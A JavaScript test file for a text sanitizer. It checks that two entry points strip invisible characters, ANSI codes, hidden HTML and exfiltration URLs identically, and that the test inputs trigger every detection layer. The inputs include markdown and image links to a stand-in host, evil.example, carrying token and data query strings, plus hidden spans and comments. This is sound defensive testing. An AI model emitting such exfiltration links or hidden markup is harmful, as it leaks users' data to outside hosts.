/**
 * Layers 1-3 have exactly ONE implementation, and both entry points reach it.
 *
 * `src/index.mjs` (`sanitize`) and `src/output.mjs` (`sanitizeText`) each used to
 * carry their own copy of Layers 1-3, and the copies had already drifted: three
 * disagreements in warning prose plus a missing pre-gate. `sanitize` is now a
 * facade over `sanitizeText`, so the two MUST agree byte-for-byte on `cleaned`,
 * `found` and `warnings` for the same input and layer selection.
 *
 * This is behavioural, not a source grep: re-forking the layer bodies back into
 * index.mjs passes a grep the moment the copy is a faithful one, but the copies
 * drift on the very next edit — and then these equalities break. Every case is
 * checked in both layer selections the facade offers, so a divergence confined
 * to one of them cannot hide.
 *
 * Non-vacuity is enforced, not assumed: COVERAGE below names one marker per
 * layer, and the suite fails if the corpus stops exercising any of them (a
 * corpus that stopped producing findings would make every equality trivially
 * true).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { sanitize, CATEGORY } from "../src/index.mjs";
import { sanitizeText } from "../src/output.mjs";
import { cp } from "./test-helpers.mjs";

const ESC = cp(0x1b);
const ZW = cp(0x200b);
const BLOB = "A".repeat(44);

/** Inputs chosen to hit every Layer 1-3 finding, plus clean/benign controls. */
const CASES = [
  ["clean text", "nothing to see here"],
  ["benign html", "hello <b>world</b>"],
  ["invisible chars", `x${ZW}y${cp(0xfe0f)}z`],
  ["ansi", `${ESC}[31mred${ESC}[0m`],
  ["long invisible run", `x${ZW.repeat(12)}y`],
  ["lone surrogate", `a${String.fromCharCode(0xd800)}b`],
  ["html comment", "a <!-- secret --> b"],
  ["hidden element", "a <span hidden>SECRET</span> b"],
  ["comment + hidden", "a <!-- one --> b <span hidden>S</span> c"],
  [
    "preserved script + data uri",
    '<script>a</script><script>b</script><img src="data:text/html,x">',
  ],
  ["markdown exfil link", `[c](https://evil.example/t?token=${BLOB})`],
  ["image exfil", `![alt](https://evil.example/p?data=${BLOB})`],
  [
    "exfil hidden behind a splice",
    `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
  ],
  [
    "every layer at once",
    `${ESC}[32m${ZW}<!-- c --><span hidden>S</span>[l](https://evil.example/p?data=${BLOB})`,
  ],
  // Plain text with no HTML tag and no markdown link: the pre-gate index.mjs
  // used to lack. Layers 2/3 are skipped, which must not change the result.
  [
    "pre-gate miss",
    "a plain sentence with https://evil.example/p?data=" + BLOB,
  ],
];

/**
 * The layer selections `sanitize` offers, each paired with the `sanitizeText`
 * options it must be equivalent to. `html` bundles Layers 2 and 3 at the facade;
 * the pipeline takes them as separate flags, so the pairing is where the
 * facade's translation is pinned.
 */
const MODES = [
  ["layer 1 only", {}, { html: false, exfilScan: false }],
  ["layers 1+2+3", { html: true }, { html: true, exfilScan: true }],
];

/**
 * Layer markers the corpus must actually produce, so an equality that holds
 * because nothing was ever found cannot pass for convergence. Each predicate
 * takes the `{ found, warnings }` of one facade result.
 */
const COVERAGE = [
  ["layer 1 strip", (r) => r.found.includes(CATEGORY.CF)],
  ["layer 1 ansi", (r) => r.found.includes(CATEGORY.ANSI)],
  ["layer 1 surrogates", (r) => r.found.includes(CATEGORY.LONE_SURROGATES)],
  ["layer 2 comments", (r) => r.found.includes(CATEGORY.HTML_COMMENTS)],
  ["layer 2 hidden", (r) => r.found.includes(CATEGORY.HIDDEN_HTML)],
  [
    "layer 2 preserved",
    (r) =>
      r.warnings.some((w) =>
        w.startsWith("Scripting/resource content present"),
      ),
  ],
  ["layer 3 exfil", (r) => r.found.includes(CATEGORY.EXFIL_URLS)],
];

describe("Layers 1-3 are implemented once: sanitize == sanitizeText", () => {
  /** @type {Array<{ found: string[], warnings: string[] }>} */
  const seen = [];

  for (const [caseName, input] of CASES)
    for (const [modeName, facadeOptions, pipelineOptions] of MODES)
      it(`${caseName} / ${modeName}: both entry points agree exactly`, async () => {
        const viaFacade = await sanitize(input, facadeOptions);
        const viaPipeline = await sanitizeText(input, pipelineOptions);
        seen.push(viaFacade);
        assert.equal(viaFacade.cleaned, viaPipeline.cleaned, "cleaned");
        assert.deepEqual(viaFacade.found, viaPipeline.found, "found");
        assert.deepEqual(viaFacade.warnings, viaPipeline.warnings, "warnings");
      });

  // Runs after the cases above (node:test executes a describe's tests in order),
  // so `seen` holds every facade result the corpus produced.
  for (const [markerName, predicate] of COVERAGE)
    it(`corpus exercises ${markerName} (equalities above are not vacuous)`, () => {
      assert.ok(
        seen.some(predicate),
        `no case produced ${markerName}; the convergence assertions would pass on empty findings`,
      );
    });

  it("the facade returns exactly the three documented fields", async () => {
    // A wider narrowing bug (leaking `modified`/`sgrNote`/`reveal` through the
    // root entry) changes the public result shape, which callers deep-equal.
    const out = await sanitize("a <!-- c --> b", { html: true });
    assert.deepEqual(Object.keys(out).sort(), ["cleaned", "found", "warnings"]);
  });
});
